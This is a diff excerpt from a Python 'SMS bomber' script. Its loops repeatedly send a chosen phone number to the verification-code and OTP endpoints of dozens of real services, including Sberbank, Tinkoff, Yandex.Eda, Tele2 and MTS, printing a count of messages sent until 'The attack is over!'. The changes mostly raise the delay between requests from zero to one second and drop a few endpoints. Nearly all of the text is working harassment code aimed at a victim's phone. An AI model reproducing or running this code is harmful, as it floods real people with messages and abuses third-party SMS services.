-            print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
-                          headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},
-                          params={"phone": _phone, "clientId": "undefined", "sessionId": str(randint(5000, 9999))})
-            R = R + 1
-            print('[+] Qlean Was sent! || Count - ' + str(R))
-            time.sleep(0)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -7345,7 +7118,7 @@ if call == str(2):
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
             R = R + 1
             print('[+] SMSgorod Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7370,7 +7143,7 @@ if call == str(2):
                                 "password": password, "phone_number": _phone, "username": username})
             R = R + 1
             print('[+] Twitch Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7382,7 +7155,7 @@ if call == str(2):
                           headers={'App-ID': 'cabinet'})
             R = R + 1
             print('[+] CabWiFi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7393,7 +7166,7 @@ if call == str(2):
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
             R = R + 1
             print('[+] wowworks Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7405,7 +7178,7 @@ if call == str(2):
                           json={"phone_number": "+" + _phone})
             R = R + 1
             print('[+] Eda.Yandex Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7416,7 +7189,7 @@ if call == str(2):
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
             R = R + 1
             print('[+] Youla Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7429,7 +7202,7 @@ if call == str(2):
                                 "deliveryOption": "sms"})
             R = R + 1
             print('[+] Alpari Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7440,7 +7213,7 @@ if call == str(2):
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
             R = R + 1
             print('[+] SMS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7451,7 +7224,7 @@ if call == str(2):
             requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
             R = R + 1
             print('[+] Delivery Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7464,14 +7237,14 @@ if call == str(2):
                                  "gorod": "Москва", "approving_data": "1", })
             R = R + 1
             print('[+] Banki Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         try:
             requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
             R = R + 1
             print('[+] IVI Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7483,7 +7256,7 @@ if call == str(2):
                           data={"firstname": _name, "phone": _phone, "email": _email})
             R = R + 1
             print('[+] Moyo Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7494,7 +7267,7 @@ if call == str(2):
             requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
             R = R + 1
             print('[+] Helsi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7506,7 +7279,7 @@ if call == str(2):
                           json={"Phone": _phone, "Type": 1})
             R = R + 1
             print('[+] KinoLend Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7519,7 +7292,7 @@ if call == str(2):
                                 '_token': '*'})
             R = R + 1
             print('[+] PizzaHut Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7530,7 +7303,7 @@ if call == str(2):
             requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
             R = R + 1
             print('[+] Rabota Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7541,7 +7314,7 @@ if call == str(2):
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
             R = R + 1
             print('[+] Rutube Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Rutube in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7552,7 +7325,7 @@ if call == str(2):
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
             R = R + 1
             print('[+] Citilink Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7564,7 +7337,7 @@ if call == str(2):
                           data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
             R = R + 1
             print('[+] Smsint Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7576,7 +7349,7 @@ if call == str(2):
                 'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
             R = R + 1
             print('[+] oyorooms Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7589,7 +7362,7 @@ if call == str(2):
                           data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
             R = R + 1
             print('[+] MVIDEO Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7602,7 +7375,7 @@ if call == str(2):
                                                               'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
             R = R + 1
             print('[+] newnext Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7613,7 +7386,7 @@ if call == str(2):
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
             R = R + 1
             print('[+] Sunlight Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7626,7 +7399,7 @@ if call == str(2):
                                 'deliveryOption': 'sms'})
             R = R + 1
             print('[+] alpari Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7637,7 +7410,7 @@ if call == str(2):
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
             R = R + 1
             print('[+] Invitro Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7650,7 +7423,7 @@ if call == str(2):
                                 'params': {'phone': _phone}, 'id': '1'})
             R = R + 1
             print('[+] Sberbank Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -7663,7 +7436,7 @@ if call == str(2):
                           params={"msisdn": _phone})
             R = R + 1
             print('[+] MTS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7675,7 +7448,7 @@ if call == str(2):
                           data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
             R = R + 1
             print('[+] Delitime Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7691,7 +7464,7 @@ if call == str(2):
                           json={"phone": {"code": 1, "number": _phone}})
             R = R + 1
             print('[+] Guru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7704,7 +7477,7 @@ if call == str(2):
                                 "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
             R = R + 1
             print('[+] ICQ Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7717,7 +7490,7 @@ if call == str(2):
                                 "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
             R = R + 1
             print('[+] InDriver Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7729,7 +7502,7 @@ if call == str(2):
                           data={"password": password, "application": "lkp", "login": "+" + _phone})
             R = R + 1
             print('[+] Invitro Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7740,7 +7513,7 @@ if call == str(2):
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
             R = R + 1
             print('[+] Pmsm Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7751,7 +7524,7 @@ if call == str(2):
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
             R = R + 1
             print('[+] IVI Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7762,7 +7535,7 @@ if call == str(2):
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
             R = R + 1
             print('[+] Lenta Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7774,7 +7547,7 @@ if call == str(2):
                           json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
             R = R + 1
             print('[+] Mail.ru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7787,7 +7560,7 @@ if call == str(2):
                           data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
             R = R + 1
             print('[+] MVideo Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -7799,33 +7572,10 @@ if call == str(2):
                           data={"st.r.phone": "+" + _phone})
             R = R + 1
             print('[+] OK Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
-            R = R + 1
-            print('[+] qlean Was sent! || Count - ' + str(R))
-            time.sleep(0)
-        except:
-            print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
-                          headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},
-                          params={"phone": _phone, "clientId": "undefined", "sessionId": str(randint(5000, 9999))})
-            R = R + 1
-            print('[+] Qlean Was sent! || Count - ' + str(R))
-            time.sleep(0)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -7834,7 +7584,7 @@ if call == str(2):
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
             R = R + 1
             print('[+] SMSgorod Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8206,28 +7956,6 @@ if call == str(2):
             print("The attack is over! Press ENTER to close...")
             break
         try:
-            requests.post('https://plink.tech/register/', json={"phone": _phone})
-            R = R + 1
-            print('[+] Plink Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
-            R = R + 1
-            print('[+] qlean Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
             R = R + 1
             print('[+] SMSgorod Was sent! || Count - ' + str(R))
@@ -8354,7 +8082,7 @@ if call == str(2):
                                 "password": password, "phone_number": _phone, "username": username})
             R = R + 1
             print('[+] Twitch Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8366,7 +8094,7 @@ if call == str(2):
                           headers={'App-ID': 'cabinet'})
             R = R + 1
             print('[+] CabWiFi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8377,7 +8105,7 @@ if call == str(2):
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
             R = R + 1
             print('[+] wowworks Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8389,7 +8117,7 @@ if call == str(2):
                           json={"phone_number": "+" + _phone})
             R = R + 1
             print('[+] Eda.Yandex Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8400,7 +8128,7 @@ if call == str(2):
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
             R = R + 1
             print('[+] Youla Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8413,7 +8141,7 @@ if call == str(2):
                                 "deliveryOption": "sms"})
             R = R + 1
             print('[+] Alpari Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8424,7 +8152,7 @@ if call == str(2):
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
             R = R + 1
             print('[+] SMS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8447,7 +8175,7 @@ if call == str(2):
                           data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                 'deviceToken': '*'}, headers={
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
-            time.sleep(0)
+            time.sleep(1)
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -8456,7 +8184,7 @@ if call == str(2):
             requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
             R = R + 1
             print('[+] RuTaxi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8467,7 +8195,7 @@ if call == str(2):
             requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
             R = R + 1
             print('[+] BelkaCar Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8479,7 +8207,7 @@ if call == str(2):
                           data={'aj': '50', 'registration-phone': _phone})
             R = R + 1
             print('[+] StarPizzaCafe Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8491,7 +8219,7 @@ if call == str(2):
                           data={'phone_number': _phone}, headers={})
             R = R + 1
             print('[+] Tinder Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -8504,7 +8232,7 @@ if call == str(2):
             requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
             R = R + 1
             print('[+] Tinkoff Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8516,7 +8244,7 @@ if call == str(2):
             requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
             R = R + 1
             print('[+] Dostavista Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8529,7 +8257,7 @@ if call == str(2):
             requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + _phone})
             R = R + 1
             print('[+] MonoBank Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8541,7 +8269,7 @@ if call == str(2):
             requests.post('https://widgets.binotel.com/getcall/call/', {"status": "success", "GetCallID": 13302425})
             R = R + 1
             print('[+] binotel Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8553,7 +8281,7 @@ if call == str(2):
                          data={"phone": _phone})
             R = R + 1
             print('[+] SportMaster Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8565,7 +8293,7 @@ if call == str(2):
             requests.post('https://alfalife.cc/auth.php', data={"phone": _phone})
             R = R + 1
             print('[+] Alfalife Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8576,7 +8304,7 @@ if call == str(2):
             requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
             R = R + 1
             print('[+] KoronaPay Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -8590,7 +8318,7 @@ if call == str(2):
                                 "oferta": "on", })
             R = R + 1
             print('[+] GGbet Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8603,7 +8331,7 @@ if call == str(2):
                                 "getSysParam": "yes", })
             R = R + 1
             print('[+] ETM Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8615,7 +8343,7 @@ if call == str(2):
             requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone, })
             R = R + 1
             print('[+] TheLive Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8626,7 +8354,7 @@ if call == str(2):
             requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
             R = R + 1
             print('[+] MTS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8637,7 +8365,7 @@ if call == str(2):
             requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
             R = R + 1
             print('[+] MyGames Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8651,7 +8379,7 @@ if call == str(2):
                                 "city": "Москва", })
             R = R + 1
             print('[+] Zoloto585 Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8662,7 +8390,7 @@ if call == str(2):
             requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})
             R = R + 1
             print('[+] Kasta Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8674,7 +8402,7 @@ if call == str(2):
                           data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
             R = R + 1
             print('[+] Тaxi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8687,7 +8415,7 @@ if call == str(2):
                           json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email", })
             R = R + 1
             print('[+] Mail.ru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8699,7 +8427,7 @@ if call == str(2):
                           json={"phone": (_phone, "+* (***) ***-**-**"), "type": "register", })
             R = R + 1
             print('[+] Creditter Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8715,7 +8443,7 @@ if call == str(2):
                                 "SecondName": _name, "Phone": _phone, "Email": _email, })
             R = R + 1
             print('[+] Ingos Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8728,7 +8456,7 @@ if call == str(2):
                                 "email": "", "lang": "en", })
             R = R + 1
             print('[+] Admiralxxx Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8739,7 +8467,7 @@ if call == str(2):
             requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
             R = R + 1
             print('[+] Av Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8751,7 +8479,7 @@ if call == str(2):
                           params={"msisdn": _phone})
             R = R + 1
             print('[+] MTS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8762,7 +8490,7 @@ if call == str(2):
             requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
             R = R + 1
             print('[+] City24 Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8773,7 +8501,7 @@ if call == str(2):
             requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
             R = R + 1
             print('[+] SushiMaster Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8784,7 +8512,7 @@ if call == str(2):
             requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
             R = R + 1
             print('[+] MultiPlex Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8795,7 +8523,7 @@ if call == str(2):
             requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone})
             R = R + 1
             print('[+] 3040 Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8807,7 +8535,7 @@ if call == str(2):
                           data={"REGISTER[PERSONAL_PHONE]": _phone, "code": "", "sendsms": "Выслать код", })
             R = R + 1
             print('[+] Niyama Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8818,7 +8546,7 @@ if call == str(2):
             requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
             R = R + 1
             print('[+] VSK Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8829,7 +8557,7 @@ if call == str(2):
             requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
             R = R + 1
             print('[+] EasyPay Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8841,7 +8569,7 @@ if call == str(2):
                           data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
             R = R + 1
             print('[+] Fix-Price Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -8853,7 +8581,7 @@ if call == str(2):
             requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
             R = R + 1
             print('[+] Tele2 Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8864,7 +8592,7 @@ if call == str(2):
             requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
             R = R + 1
             print('[+] Finam Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8876,7 +8604,7 @@ if call == str(2):
                           params={"cb_fio": _name, "cb_phone": format(_phone, "+* *** *** ** **")})
             R = R + 1
             print('[+] MakiMaki Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8890,7 +8618,7 @@ if call == str(2):
                           json={"loginId": "+" + _phone, "supportAllStates": True})
             R = R + 1
             print('[+] FlipKart Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8901,7 +8629,7 @@ if call == str(2):
             requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
             R = R + 1
             print('[+] Online.ua Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -8912,7 +8640,7 @@ if call == str(2):
             requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
             R = R + 1
             print('[+] PlanetaKino Was sent!')
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
